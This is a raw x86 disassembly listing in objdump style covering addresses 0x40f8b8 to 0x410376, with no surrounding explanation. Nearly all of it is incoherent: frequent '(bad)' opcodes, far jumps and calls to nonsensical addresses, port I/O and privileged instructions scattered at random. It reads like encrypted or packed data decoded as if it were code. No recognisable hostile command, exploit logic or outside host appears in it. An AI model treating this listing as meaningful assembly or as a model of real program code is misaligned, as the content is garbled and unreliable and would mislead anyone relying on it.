  40f8b8:	jle    0x40f901
  40f8ba:	jg     0x40f83e
  40f8bc:	out    0x74,eax
  40f8be:	sub    ch,dl
  40f8c0:	cmc    
  40f8c1:	cmp    ecx,0xd
  40f8c4:	fisttp QWORD PTR [ecx]
  40f8c6:	fs and bh,0x74
  40f8ca:	push   edx
  40f8cb:	(bad)  
  40f8cd:	and    ecx,0x5b
  40f8d0:	data16 ja 0x40f885
  40f8d3:	cdq    
  40f8d4:	pop    esi
  40f8d5:	jmp    0x17fbd7aa
  40f8da:	ins    BYTE PTR es:[edi],dx
  40f8db:	sub    eax,DWORD PTR [ecx+0x1e]
  40f8de:	mov    ebx,0xe54458c
  40f8e3:	mov    WORD PTR [ebx-0x1af94eed],?
  40f8e9:	call   0xf5825c20
  40f8ee:	mov    ds:0x5fdc258c,eax
  40f8f3:	ficomp DWORD PTR ds:0xe83fa6e9
  40f8f9:	add    edi,DWORD PTR [esi]
  40f8fb:	fisubr WORD PTR [edx+0x3cd6b717]
  40f901:	jmp    0xfaeb:0x27698c78
  40f908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f909:	add    edi,DWORD PTR ds:0x925ba706
  40f90f:	sti    
  40f910:	daa    
  40f911:	add    al,0x59
  40f913:	(bad)  
  40f914:	xchg   esp,eax
  40f915:	jmp    0x5901856a
	...
  40f942:	add    BYTE PTR [eax],al
  40f944:	fistp  DWORD PTR [edx-0x17]
  40f947:	cld    
  40f948:	add    DWORD PTR [edi],0x22c45c14
  40f94e:	sub    BYTE PTR [ecx+esi*1],al
  40f951:	push   es
  40f952:	fstp   st(3)
  40f954:	mov    dh,0xd6
  40f956:	lods   eax,DWORD PTR ds:[esi]
  40f957:	call   0xe99dbf7c
  40f95c:	sbb    BYTE PTR [eax+edi*1-0x6a291124],cl
  40f963:	call   0x428fce1
  40f968:	adc    ebp,ecx
  40f96a:	sbb    cl,ch
  40f96c:	jb     0x40f9d1
  40f96e:	xchg   ecx,eax
  40f96f:	(bad)  
  40f970:	fwait
  40f971:	mov    edi,edi
  40f973:	jne    0x40f97a
  40f975:	mov    ds:0x82d66e7f,al
  40f97a:	shr    ecx,cl
  40f97c:	cmp    eax,0x5d94685b
  40f981:	sbb    al,BYTE PTR [eax]
  40f983:	push   esi
  40f984:	cwde   
  40f985:	(bad)  
  40f986:	std    
  40f987:	dec    esi
  40f988:	(bad)  
  40f989:	jae    0x40f9b3
  40f98b:	aam    0x3d
  40f98d:	pop    ebx
  40f98e:	or     ebp,DWORD PTR [ecx]
  40f990:	and    DWORD PTR ds:0x1a656368,edi
  40f996:	add    BYTE PTR [esi],ch
  40f998:	adc    BYTE PTR [edi-0x18],ah
  40f99b:	stos   BYTE PTR es:[edi],al
  40f99c:	sbb    DWORD PTR [ebp-0x381fe102],ecx
  40f9a2:	std    
  40f9a3:	push   ss
  40f9a4:	xchg   esi,eax
  40f9a5:	sbb    ebp,eax
  40f9a7:	bound  eax,QWORD PTR [eax]
	...
  40f9d1:	add    BYTE PTR [ecx],al
  40f9d3:	(bad)  
  40f9d4:	(bad)  
  40f9d5:	cdq    
  40f9d6:	pushw  es
  40f9d8:	adc    dh,bh
  40f9da:	jecxz  0x40fa3a
  40f9dc:	push   eax
  40f9dd:	neg    bl
  40f9df:	(bad)  
  40f9e0:	call   0xfecd4f41
  40f9e5:	sar    DWORD PTR [ebp+0x59deff0b],1
  40f9eb:	(bad)  
  40f9ec:	mov    bl,0xd7
  40f9ee:	popa   
  40f9ef:	mov    edi,fs
  40f9f1:	pop    ds
  40f9f2:	in     eax,0x5a
  40f9f4:	add    BYTE PTR [edx+0x2a],ch
  40f9f7:	pop    ebp
  40f9f8:	jb     0x40f9cf
  40f9fa:	mov    ah,0xef
  40f9fc:	mov    bl,0xb7
  40f9fe:	and    DWORD PTR [edx+0x74bd9902],ecx
  40fa04:	add    DWORD PTR [edi],ecx
  40fa06:	ret    
  40fa07:	inc    esp
  40fa08:	sbb    cl,BYTE PTR cs:[edi+0x6a29eb5d]
  40fa0f:	lahf   
  40fa10:	pop    edi
  40fa11:	sub    BYTE PTR [edx],bh
  40fa13:	mov    dh,BYTE PTR [eax+eax*1-0x27ec5]
  40fa1a:	iret   
  40fa1b:	sahf   
  40fa1c:	push   0x0
  40fa1e:	xlat   BYTE PTR ds:[ebx]
  40fa1f:	cs push 0x2037d0
  40fa25:	(bad)  
  40fa26:	mov    edx,0x70fffccb
  40fa2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa2c:	mov    al,0x6c
  40fa2e:	xlat   BYTE PTR ds:[ebx]
  40fa2f:	pop    esi
  40fa30:	push   eax
  40fa31:	push   0x40ff12
	...
  40fa5e:	add    BYTE PTR [eax],al
  40fa60:	add    ah,cl
  40fa62:	mov    dl,0xfe
  40fa64:	jo     0x40f9e8
  40fa66:	out    0xa1,al
  40fa68:	sbb    DWORD PTR [esi+0x0],0x5a
  40fa6c:	into   
  40fa6d:	test   DWORD PTR [esi-0x2f7a708b],edi
  40fa73:	jne    0x40fa10
  40fa75:	test   edi,eax
  40fa77:	je     0x40f9fa
  40fa79:	mov    cl,BYTE PTR es:[eax-0x2a]
  40fa7d:	pop    esi
  40fa7e:	push   DWORD PTR [ebp-0x65]
  40fa81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa82:	scas   eax,DWORD PTR es:[edi]
  40fa83:	xor    DWORD PTR [eax-0x7f],0xfffffffd
  40fa87:	mov    ch,0x2b
  40fa89:	cmp    ebp,0xf7a6c7ff
  40fa8f:	and    DWORD PTR [eax-0x7f],0x4e
  40fa93:	(bad)  
  40fa94:	jmp    0xff2e:0x6375ff6e
  40fa9b:	jne    0x40fafc
  40fa9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa9e:	data16 cli 
  40faa0:	add    BYTE PTR [ecx-0x7d8f0e1a],al
  40faa6:	std    
  40faa7:	lea    ebx,[edx-0x2f000364]
  40faad:	sub    eax,0x80a3b5ff
  40fab2:	std    
  40fab3:	jmp    FWORD PTR [edi+0x3e006b12]
  40fab9:	je     0x40fb3a
  40fabb:	mov    edi,0xfe1fff31
  40fac0:	stc    
  40fac1:	loopne 0x40faa8
  40fac3:	mov    ah,0x0
	...
  40faed:	add    BYTE PTR [edx-0x290119f7],dh
  40faf3:	arpl   WORD PTR [ebx+0x0],bx
  40faf6:	ds stc 
  40faf8:	scas   eax,DWORD PTR es:[edi]
  40faf9:	mov    bh,0xd8
  40fafb:	add    dh,ah
  40fafd:	out    0xff,eax
  40faff:	test   al,0xe5
  40fb01:	(bad)  
  40fb02:	div    DWORD PTR ds:0xfd6b0013
  40fb08:	(bad)  
  40fb09:	(bad)  
  40fb0a:	xor    edx,DWORD PTR [eax+0x494e74e5]
  40fb10:	jo     0x40fb1e
  40fb12:	test   eax,0x2be7fac6
  40fb17:	aaa    
  40fb18:	out    0xfe,al
  40fb1a:	xchg   DWORD PTR ds:0xceafff7,esi
  40fb20:	xlat   BYTE PTR ds:[ebx]
  40fb21:	add    BYTE PTR [edx+0xbff4e63],0xa8
  40fb28:	fidivr DWORD PTR [edx+0xae660c2]
  40fb2e:	jle    0x40fb3e
  40fb30:	add    BYTE PTR [edi+0x77],bl
  40fb33:	xor    eax,0xe60fff7
  40fb38:	adc    ebp,eax
  40fb3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb3b:	mul    esp
  40fb3d:	inc    BYTE PTR [ebp-0x4c]
  40fb40:	outs   dx,BYTE PTR ds:[esi]
  40fb41:	add    eax,0xbc1bae9
  40fb46:	ds cdq 
  40fb48:	outs   dx,BYTE PTR ds:[esi]
  40fb49:	or     al,0x26
  40fb4b:	mov    bh,0x79
  40fb4d:	(bad)  
  40fb4e:	xor    DWORD PTR [esi+0x74c2],ecx
	...
  40fb7c:	cmp    DWORD PTR [edx],ebx
  40fb7e:	jp     0x40fbc7
  40fb80:	jg     0x40fbf4
  40fb82:	jecxz  0x40fbf8
  40fb84:	dec    edx
  40fb85:	pop    ebx
  40fb86:	xchg   ecx,eax
  40fb87:	add    bh,BYTE PTR [ebp+0x37d99d88]
  40fb8d:	cmc    
  40fb8e:	call   0x81988677
  40fb93:	out    dx,al
  40fb94:	mov    edi,0x7a7b8588
  40fb99:	(bad)  
  40fb9a:	adc    BYTE PTR [edi+0x5e],ah
  40fb9d:	sbb    ch,cl
  40fb9f:	in     al,0x6a
  40fba1:	pop    DWORD PTR [eax+0x6588bfde]
  40fba7:	jnp    0x40fc23
  40fba9:	adc    eax,0xffffffd9
  40fbac:	retf   0xe95b
  40fbaf:	fld    TBYTE PTR [esi+0x8]
  40fbb2:	dec    esi
  40fbb3:	in     eax,0xc6
  40fbb5:	push   ds
  40fbb6:	inc    ebp
  40fbb7:	pop    esp
  40fbb8:	ds imul ebp,ecx,0x3
  40fbbc:	xchg   esi,eax
  40fbbd:	pop    ds
  40fbbe:	mov    dh,0xe4
  40fbc0:	mov    al,ds:0x98f3a3d2
  40fbc5:	push   cs
  40fbc6:	and    esp,ebx
  40fbc8:	nop
  40fbc9:	fcomp  QWORD PTR ds:0xe59b34e5
  40fbcf:	jg     0x40fb93
  40fbd1:	pop    ebx
  40fbd2:	jmp    0x14f74da
  40fbd7:	pop    esp
  40fbd8:	data16 xchg al,ch
  40fbdb:	add    ebp,DWORD PTR [ecx+0xe]
  40fbde:	cmc    
  40fbdf:	fild   DWORD PTR [eax]
	...
  40fc09:	add    BYTE PTR [ebx-0x42fc170b],ah
  40fc0f:	sub    edx,0xfffffff4
  40fc12:	mov    ebx,0x3e03e8bf
  40fc17:	aam    0x53
  40fc19:	call   0xf52a43df
  40fc1e:	mov    ebp,0x3e03e8e2
  40fc23:	repz jb 0x40fc89
  40fc26:	jg     0x40fc83
  40fc28:	add    BYTE PTR [esi],bl
  40fc2a:	add    ah,BYTE PTR [esi]
  40fc2c:	imul   ebp,ecx,0x3d
  40fc2f:	push   esp
  40fc30:	rcr    BYTE PTR ds:0xa17488a3,0x65
  40fc37:	mov    BYTE PTR [esi],cl
  40fc39:	jmp    0x99b5847b
  40fc3e:	xchg   ebp,eax
  40fc3f:	xlat   BYTE PTR ds:[ebx]
  40fc40:	inc    edi
  40fc41:	sub    BYTE PTR [edx],bh
  40fc43:	repz pushf 
  40fc45:	or     DWORD PTR [ebp+0x5b],edi
  40fc48:	push   edi
  40fc49:	sub    DWORD PTR [esi-0xb],0xc7d6e8ff
  40fc50:	jae    0x40fc13
  40fc52:	fimul  DWORD PTR [esi]
  40fc54:	clc    
  40fc55:	sar    DWORD PTR [ebx+esi*8],cl
  40fc58:	xchg   ecx,eax
  40fc59:	leave  
  40fc5a:	jl     0x40fcb7
  40fc5c:	push   edi
  40fc5d:	inc    ecx
  40fc5e:	sub    al,0xf5
  40fc60:	(bad)  
  40fc61:	call   0xb4418c24
  40fc66:	pop    eax
  40fc67:	mov    BYTE PTR [ecx+edi*1-0x66],dh
  40fc6b:	push   cs
  40fc6c:	hlt    
  40fc6d:	inc    ecx
	...
  40fc96:	add    BYTE PTR [eax],al
  40fc98:	pop    ebx
  40fc99:	(bad)  
  40fc9b:	es in  eax,dx
  40fc9d:	ror    edi,cl
  40fc9f:	adc    al,BYTE PTR [edi+eax*1+0x5c10c63a]
  40fca6:	(bad)  
  40fca7:	jmp    0x40fcaa
  40fca9:	sbb    eax,0x5de11b0b
  40fcae:	add    bl,0x3d
  40fcb1:	push   cs
  40fcb2:	out    dx,al
  40fcb3:	not    bl
  40fcb5:	push   0x50
  40fcb7:	out    dx,al
  40fcb8:	jmp    0x40fd0c
  40fcba:	call   0xfec9596d
  40fcbf:	rcr    ebp,1
  40fcc1:	or     bh,bh
  40fcc3:	(bad)  
  40fcc4:	push   ecx
  40fcc5:	push   ebp
  40fcc6:	call   DWORD PTR [edx+esi*1-0x7a]
  40fcca:	je     0x40fccc
  40fccc:	idiv   DWORD PTR [edx+0x73]
  40fccf:	or     BYTE PTR [edi],cl
  40fcd1:	out    dx,al
  40fcd2:	cld    
  40fcd3:	(bad)  
  40fcd4:	call   0x8f012e54
  40fcd9:	jp     0x40fcd8
  40fcdb:	(bad)  
  40fcdc:	fsubr  DWORD PTR [ebp+0x6a2038ac]
  40fce2:	test   DWORD PTR [eax-0x58],ebp
  40fce5:	jp     0x40fce4
  40fce7:	call   DWORD PTR [edx-0x5d]
  40fcea:	out    0x55,al
  40fcec:	cmp    DWORD PTR [edx-0x3],edi
  40fcef:	push   edx
  40fcf1:	stos   BYTE PTR es:[edi],al
  40fcf2:	out    0x4d,al
  40fcf4:	jmp    0xd340fa72
  40fcf9:	mov    ds:0x45e6,al
	...
  40fd26:	fnstcw WORD PTR [ecx-0x3]
  40fd29:	push   edx
  40fd2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd2c:	out    0x3d,al
  40fd2e:	jmp    0x9340faac
  40fd33:	mov    bh,ch
  40fd35:	jne    0x40fce2
  40fd37:	jns    0x40fdac
  40fd39:	or     BYTE PTR [edi],cl
  40fd3b:	sub    eax,0x1a68fffe
  40fd40:	leave  
  40fd41:	ret    0x5a7b
  40fd44:	push   ebp
  40fd45:	mov    ebp,DWORD PTR [ebx]
  40fd47:	faddp  st(2),st
  40fd49:	call   0xff552176
  40fd4e:	mov    ds:0xbd8de68a,al
  40fd53:	pop    edx
  40fd54:	add    BYTE PTR [ebx],cl
  40fd56:	daa    
  40fd57:	and    edx,DWORD PTR [edi+0x6a]
  40fd5a:	push   edi
  40fd5b:	repnz mov eax,ds:0xff5a9660
  40fd61:	jne    0x40fdda
  40fd63:	jns    0x40fdd8
  40fd65:	or     al,0x6f
  40fd67:	test   DWORD PTR [edi-0x1],edi
  40fd6a:	push   0x3e74c055
  40fd6f:	xor    esi,DWORD PTR [eax+edx*2]
  40fd72:	es mov edx,0x8931fe89
  40fd78:	ret    0x6f73
  40fd7b:	or     ecx,DWORD PTR [eax-0x18]
  40fd7e:	xchg   esp,eax
  40fd7f:	stos   BYTE PTR es:[edi],al
  40fd80:	jmp    0xfe0a:0xe1b4bc41
  40fd87:	addr16 (bad) 
  40fd89:	inc    BYTE PTR [eax]
	...
  40fdb3:	add    BYTE PTR [ebx-0x1117cba4],dl
  40fdb9:	repnz loope 0x40fdba
  40fdbc:	mov    ss,ebp
  40fdbe:	push   edi
  40fdbf:	call   0x898db52
  40fdc4:	(bad)  
  40fdc5:	test   al,0xe0
  40fdc7:	(bad)  
  40fdc8:	loope  0x40fda5
  40fdca:	int    0x7c
  40fdcc:	fxtract 
  40fdce:	loope  0x40fe44
  40fdd0:	out    0x2b,al
  40fdd2:	(bad)  
  40fdd3:	jl     0x40fd9e
  40fdd5:	and    al,0xeb
  40fdd7:	mov    ebp,0x67e22d43
  40fddc:	ds jl  0x40fde1
  40fddf:	add    BYTE PTR [esi-0x56009fb8],ah
  40fde5:	or     cl,BYTE PTR [eax-0x8]
  40fde8:	mov    bl,0xb6
  40fdea:	fimul  WORD PTR [edi-0x67]
  40fded:	into   
  40fdee:	repnz dec BYTE PTR [ebx]
  40fdf1:	nop
  40fdf2:	jmp    0x7e0b:0x27417d3
  40fdf9:	out    0x52,al
  40fdfb:	mov    DWORD PTR [ebx],0x3e000364
  40fe01:	je     0x40fdcc
  40fe03:	inc    esp
  40fe04:	jb     0x40fd8a
  40fe06:	or     BYTE PTR [eax],al
  40fe08:	fiadd  DWORD PTR ds:[edx]
  40fe0b:	push   0x3e
  40fe0d:	fiadd  DWORD PTR [edx]
  40fe0f:	push   0x3e
  40fe11:	pop    ebx
  40fe12:	je     0x40fe5b
  40fe14:	push   edx
  40fe15:	sub    bl,dh
  40fe17:	push   edi
	...
  40fe40:	add    BYTE PTR [eax],al
  40fe42:	inc    esi
  40fe43:	test   DWORD PTR [ebx-0x2c],ebx
  40fe46:	cmp    BYTE PTR [edi],cl
  40fe48:	int    0xec
  40fe4a:	jecxz  0x40fe3e
  40fe4c:	call   0x34dc3354
  40fe51:	push   es
  40fe52:	adc    eax,0x818e4142
  40fe57:	sbb    ch,cl
  40fe59:	loopne 0x40fde5
  40fe5b:	imul   edx,DWORD PTR [ecx-0x627b40fa],0xffffffe1
  40fe62:	mov    al,BYTE PTR [ebx-0x257513c8]
  40fe68:	(bad)  
  40fe69:	loope  0x40fe31
  40fe6b:	push   ds
  40fe6c:	xchg   ebp,eax
  40fe6d:	loope  0x40fee1
  40fe6f:	arpl   WORD PTR [esi+0x57],di
  40fe72:	dec    edx
  40fe73:	test   bl,bh
  40fe75:	out    dx,eax
  40fe76:	fmul   DWORD PTR [esi]
  40fe78:	fucom  st(0)
  40fe7a:	dec    edx
  40fe7b:	push   ebx
  40fe7c:	push   ecx
  40fe7d:	sti    
  40fe7e:	enter  0x5d84,0xe1
  40fe82:	dec    edx
  40fe83:	ja     0x40fec5
  40fe85:	sbb    eax,0xe14d843b
  40fe8a:	cli    
  40fe8b:	mov    dl,BYTE PTR [ecx-0x7f]
  40fe8e:	test   al,0xe
  40fe90:	cmp    eax,0xe8f207ec
  40fe95:	add    ebx,DWORD PTR [ecx+0x5bec310e]
  40fe9b:	push   es
  40fe9c:	es loope 0x40ff15
  40fe9f:	cdq    
  40fea0:	hlt    
  40fea1:	add    ebp,ebx
  40fea3:	iret   
  40fea4:	add    al,0x83
	...
  40fece:	add    BYTE PTR [eax],al
  40fed0:	jge    0x40fe61
  40fed2:	push   cs
  40fed3:	loope  0x40ff45
  40fed5:	icebp  
  40fed6:	call   0x73c52148
  40fedb:	or     edx,DWORD PTR [esi+0x1e]
  40fede:	add    BYTE PTR [ebx+0x5e],dh
  40fee1:	test   DWORD PTR [eax+0x49d71a4],ecx
  40fee7:	pop    esp
  40fee8:	loop   0x40ff03
  40feea:	add    cl,ch
  40feec:	cmp    eax,0xc064005b
  40fef1:	mov    ebp,?
  40fef3:	into   
  40fef4:	push   ds
  40fef5:	adc    al,0x68
  40fef7:	in     eax,dx
  40fef8:	cmp    al,0x5b
  40fefa:	add    cl,dl
  40fefc:	out    dx,al
  40fefd:	sti    
  40fefe:	(bad)  
  40feff:	call   0x28a21ea9
  40ff04:	cmp    dh,bl
  40ff06:	cmp    ecx,DWORD PTR [eax]
  40ff08:	jge    0x40ff65
  40ff0a:	push   0x1a9d37
  40ff0f:	xchg   esi,eax
  40ff10:	push   eax
  40ff11:	mov    ch,0x47
  40ff13:	sub    BYTE PTR [edx],bh
  40ff15:	test   BYTE PTR [ecx+esi*8-0x2b],dh
  40ff19:	mov    ebx,0xfbde7efd
  40ff1e:	inc    ebx
  40ff1f:	or     BYTE PTR [ebp+0x5b],bh
  40ff22:	push   0x1a5cad
  40ff27:	rol    DWORD PTR [edi],1
  40ff29:	cli    
  40ff2a:	inc    eax
  40ff2b:	jmp    0xe9415885
  40ff30:	mov    ebp,0xe17484
	...
  40ff5d:	add    BYTE PTR [ebp-0x61b90231],ah
  40ff63:	(bad)  
  40ff64:	test   BYTE PTR [esi],dh
  40ff66:	lahf   
  40ff67:	test   dh,bh
  40ff69:	cdq    
  40ff6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff6b:	sub    ebp,DWORD PTR [eax-0x17]
  40ff6e:	cmp    eax,0x9e257484
  40ff73:	push   cs
  40ff74:	or     BYTE PTR [ecx],dl
  40ff76:	add    BYTE PTR [ecx],0xff
  40ff79:	push   ss
  40ff7a:	test   BYTE PTR [ecx-0x2fd716fd],bl
  40ff80:	jmp    0x40ff82
  40ff82:	(bad)  
  40ff83:	fwait
  40ff84:	repnz (bad) 
  40ff86:	pusha  
  40ff87:	mov    ds:0x3cbd0068,eax
  40ff8c:	push   DWORD PTR [ebp+0x5f]
  40ff8f:	outs   dx,DWORD PTR ds:[esi]
  40ff90:	mov    esp,0x87a36079
  40ff95:	inc    ebp
  40ff96:	arpl   ax,si
  40ff98:	sbb    eax,ebp
  40ff9a:	sti    
  40ff9b:	xlat   BYTE PTR ds:[ebx]
  40ff9c:	std    
  40ff9d:	call   FWORD PTR [edi+ebx*4]
  40ffa0:	jb     0x40ffc6
  40ffa2:	(bad)  
  40ffa3:	adc    esp,DWORD PTR [ecx+0x41]
  40ffa6:	pop    ss
  40ffa7:	dec    edi
  40ffa8:	call   0xfde3a70d
  40ffad:	push   eax
  40ffae:	jg     0x410007
  40ffb0:	adc    bh,ch
  40ffb2:	mov    eax,ds:0x566187ef
  40ffb7:	push   edi
  40ffb8:	push   eax
  40ffb9:	call   FWORD PTR [edx+0x4f]
  40ffbc:	call   0xfde37a0c
  40ffc1:	call   0x40ffc6
	...
  40ffea:	add    BYTE PTR [eax],al
  40ffec:	dec    ebx
  40ffed:	sti    
  40ffee:	(bad)  
  40ffef:	call   FWORD PTR [eax+0x26607554]
  40fff5:	push   edi
  40fff6:	add    DWORD PTR [eax],eax
  40fff8:	out    0x5e,eax
  40fffa:	lea    eax,[ebp-0x25e98]
  410000:	xchg   esi,esi
  410002:	add    eax,DWORD PTR [ecx]
  410004:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410005:	pop    esi
  410006:	call   0x9f7904
  41000b:	push   0x40f7db
  410010:	(bad)  
  410011:	bound  esp,QWORD PTR [ecx+0x41]
  410014:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410015:	not    BYTE PTR [ebp+0x61]
  410018:	out    0x5e,al
  41001a:	push   DWORD PTR ds:0x410ef1
  410020:	and    BYTE PTR [eax+ecx*1],ah
  410023:	call   0xff226666
  410028:	jno    0x410006
  41002a:	inc    esi
  41002b:	popa   
  41002c:	push   DWORD PTR [ebx+0x6a]
  41002f:	cmp    al,0xdf
  410031:	mov    dl,0x2
  410033:	push   0x43d2f0
  410038:	out    0x75,al
  41003a:	add    al,BYTE PTR [eax]
  41003c:	mov    esi,0x56085779
  410041:	retf   0xfedf
  410044:	cmp    edi,esi
  410046:	xchg   esi,esi
  410048:	xor    BYTE PTR [ecx-0x29e9b023],dl
  41004e:	add    BYTE PTR gs:[eax],al
	...
  410079:	add    BYTE PTR [esi],bh
  41007b:	rcl    DWORD PTR [edi-0x4],0x19
  41007f:	aas    
  410080:	or     al,0xe8
  410082:	cdq    
  410083:	dec    ebx
  410084:	(bad)  
  410086:	div    DWORD PTR [ebp+0xd6b0006]
  41008c:	out    dx,eax
  41008d:	add    BYTE PTR [edx],0xe0
  410090:	fdiv   st(6),st
  410092:	icebp  
  410093:	pop    ebp
  410094:	add    al,0x6a
  410096:	and    cl,bl
  410098:	push   edi
  410099:	or     dh,dl
  41009b:	mov    ebx,DWORD PTR [ebx-0x1]
  41009e:	fsqrt  
  4100a0:	inc    edi
  4100a1:	cld    
  4100a2:	stc    
  4100a3:	jbe    0x4100fc
  4100a5:	pusha  
  4100a6:	jg     0x41011c
  4100a8:	add    al,BYTE PTR [eax]
  4100aa:	ds je  0x41003c
  4100ad:	test   BYTE PTR [ecx+0xefede29],dh
  4100b3:	pushf  
  4100b4:	push   es
  4100b5:	add    DWORD PTR [esi],edi
  4100b7:	je     0x4100a3
  4100b9:	jno    0x4100d4
  4100bb:	je     0x4100bf
  4100bd:	push   0x4392dd
  4100c2:	sub    esp,DWORD PTR es:[ecx+eax*2+0x3e]
  4100c7:	pop    ebx
  4100c8:	xchg   ecx,eax
  4100c9:	xor    eax,0xdee91c1f
  4100ce:	xor    dh,BYTE PTR [ecx-0x7dc1bb60]
  4100d4:	xchg   ebx,eax
  4100d5:	or     edx,DWORD PTR [esi-0xb]
  4100d8:	add    ebx,esi
  4100da:	pusha  
  4100db:	repnz dec ecx
  4100dd:	add    BYTE PTR fs:[eax],al
	...
  410108:	call   FWORD PTR [edx-0x7f]
  41010b:	jl     0x4100eb
  41010d:	sbb    ebp,ecx
  41010f:	imul   esi,eax,0xfffffffb
  410112:	daa    
  410113:	add    al,0xd6
  410115:	pop    esp
  410116:	jmp    0x5bc1bf1e
  41011b:	or     al,0x26
  41011d:	adc    esp,ecx
  41011f:	(bad)  [eax]
  410121:	iret   
  410122:	imul   edx,ebp,0x23
  410125:	cmp    DWORD PTR [ebp+0x4e652634],0x33803e04
  41012f:	loopne 0x410139
  410131:	pop    es
  410132:	icebp  
  410133:	jmp    0x410116
  410135:	add    ebx,DWORD PTR [esi-0x1361f923]
  41013b:	add    ecx,DWORD PTR [ebx-0x27c832c]
  410141:	xchg   DWORD PTR [esi-0x170a1f23],eax
  410147:	imul   esp,DWORD PTR [ecx],0xe60bfb80
  41014d:	(bad)  
  41014f:	fmul   st(0),st
  410151:	shr    BYTE PTR [ebx-0x2ba90721],cl
  410157:	arpl   di,di
  410159:	pop    edx
  41015a:	jmp    0x5c9c3f62
  41015f:	xchg   DWORD PTR [eax-0xe22ba7f],esi
  410165:	repnz in al,0x2
  410168:	ds pop ebx
  41016a:	add    BYTE PTR [ecx+0x0],al
	...
  410195:	add    BYTE PTR [edi+0x15e8fff6],ah
  41019b:	mov    esi,0xf33da860
  4101a0:	mov    dh,0x88
  4101a2:	cld    
  4101a3:	pop    edx
  4101a4:	push   0x19dcbf
  4101a9:	push   cs
  4101aa:	push   ecx
  4101ab:	mov    cl,0x47
  4101ad:	test   al,0x3d
  4101af:	xor    BYTE PTR [ecx+esi*8+0x65],0x7c
  4101b4:	sti    
  4101b5:	div    BYTE PTR [edx-0x8]
  4101b8:	mov    esp,0x685afc88
  4101bd:	sahf   
  4101be:	fcomp  QWORD PTR [ecx]
  4101c0:	add    BYTE PTR [ecx+0x70],dl
  4101c3:	cli    
  4101c4:	inc    eax
  4101c5:	jmp    0xe9415f6f
  4101ca:	mov    ebp,0x15f17480
  4101cf:	cwde   
  4101d0:	sti    
  4101d1:	mov    esi,0xbe84cefa
  4101d6:	repz cmp dh,0x19
  4101da:	sbb    ch,ah
  4101dc:	gs jmp 0x9db5821f
  4101e2:	sbb    al,BYTE PTR [edi]
  4101e4:	or     BYTE PTR [ecx-0x7100fccc],al
  4101ea:	hlt    
  4101eb:	cdq    
  4101ec:	add    ebp,ecx
  4101ee:	sub    ah,dl
  4101f0:	jmp    0x41025a
  4101f2:	add    DWORD PTR [ebp+edi*8-0xe0d8a],ecx
  4101f9:	add    al,BYTE PTR [eax]
	...
  410223:	add    BYTE PTR [edx],bl
  410225:	xor    BYTE PTR [ecx+esi*8-0x2b],0x81
  41022a:	jbe    0x41028a
  41022c:	call   0x7556:0x7a5544d2
  410233:	leave  
  410234:	cld    
  410235:	pop    edx
  410236:	add    BYTE PTR [eax],al
  410238:	xchg   edi,eax
  410239:	pop    ebx
  41023a:	add    BYTE PTR [ebp-0x358de],cl
  410240:	dec    eax
  410241:	dec    esp
  410242:	push   0x5b9604
  410247:	call   0x40f7ff
  41024c:	iret   
  41024d:	enter  0x415f,0x67
  410251:	repz int3 
  410253:	popa   
  410254:	xchg   esi,eax
  410255:	pop    ebx
  410256:	push   0x1cb656
  41025b:	call   DWORD PTR [edx+0x674146ad]
  410261:	sahf   
  410262:	jae    0x41026c
  410264:	aas    
  410265:	inc    ecx
  410266:	cld    
  410267:	call   FWORD PTR [eax-0x12]
  41026a:	aam    0x61
  41026c:	push   di
  41026e:	push   0x1886cd
  410273:	push   0x40f871
  410278:	(bad)  
  410279:	push   ebp
  41027a:	add    BYTE PTR [eax],al
  41027c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41027d:	mov    ds:0x18ff0873,al
  410282:	cld    
  410283:	(bad)  
  410284:	fcom   st(4)
  410286:	xor    edi,0x0
	...
  4102b1:	add    cl,bl
  4102b3:	mov    ds:0x54cf50fd,al
  4102b8:	data16 add bh,ah
  4102bb:	mov    eax,ds:0x2cb8fc73
  4102c0:	or     al,ch
  4102c2:	lds    ebp,FWORD PTR [edx]
  4102c4:	(bad)  
  4102c5:	dec    DWORD PTR [esi+0x32000295]
  4102cb:	into   
  4102cc:	jmp    0xed00:0x68a3a383
  4102d3:	das    
  4102d4:	push   DWORD PTR [ebp-0x51]
  4102d7:	jb     0x41034d
  4102d9:	ja     0x410319
  4102db:	and    eax,0x100388db
  4102e0:	outs   dx,BYTE PTR ds:[esi]
  4102e1:	add    BYTE PTR [esi],dl
  4102e3:	sbb    ah,BYTE PTR [ebp+0x41]
  4102e6:	lods   al,BYTE PTR ds:[esi]
  4102e8:	jmp    0xd834:0xd973ff60
  4102ef:	mov    esp,0x78960043
  4102f4:	push   edi
  4102f5:	(bad)  
  4102f6:	jns    0x410281
  4102f8:	ret    0x5773
  4102fb:	les    ebp,FWORD PTR [edx+0x0]
  4102fe:	ds jge 0x410299
  410301:	addr16 xor al,0xd2
  410304:	inc    ebx
  410305:	add    dh,ch
  410307:	jl     0x410358
  410309:	or     BYTE PTR [esi-0x7a],ah
  41030c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41030d:	dec    BYTE PTR [ecx+0x5c]
  410310:	add    edi,DWORD PTR [edx+0x41]
  410313:	jne    0x410381
	...
  41033d:	add    BYTE PTR [eax],al
  41033f:	add    BYTE PTR [esi+0x3e416473],ah
  410345:	sbb    al,0xec
  410347:	pusha  
  410348:	jg     0x4103be
  41034a:	fnstenv [eax+edx*8]
  41034d:	dec    ebx
  41034e:	inc    ebp
  41034f:	add    BYTE PTR [esi],ah
  410351:	mov    WORD PTR [edi-0x1],ss
  410354:	adc    DWORD PTR [ecx-0x3e],edi
  410357:	jae    0x410380
  410359:	fs ins BYTE PTR es:[edi],dx
  41035b:	add    BYTE PTR [esi],bh
  41035d:	in     eax,0x98
  41035f:	addr16 inc esp
  410361:	push   edx
  410362:	inc    ebp
  410363:	add    BYTE PTR [esi-0x29f7b01b],cl
  410369:	mov    ecx,0xebe1fea4
  41036e:	mov    ch,0x78
  410370:	frndint 
  410372:	fnstenv [edx+edx*8+0x4]
  410376:	push   eax
